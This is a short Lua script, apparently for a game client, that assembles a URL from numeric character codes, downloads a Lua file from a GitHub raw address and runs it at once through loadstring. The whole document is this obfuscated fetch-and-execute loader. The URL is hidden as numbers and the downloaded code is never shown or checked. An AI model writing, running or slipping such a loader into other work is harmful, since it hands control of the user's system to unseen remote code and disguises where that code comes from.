local urlScript = ''
for i, v in ipairs({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,76,117,114,49,113,117,51,47,114,49,113,46,108,117,97,47,109,97,105,110,47,114,49,113,46,108,117,97}) do 
    urlScript = urlScript..string.char(v) 
end
modules.corelib.HTTP.get(urlScript, function(script) 
    assert(loadstring(script))() 
end);
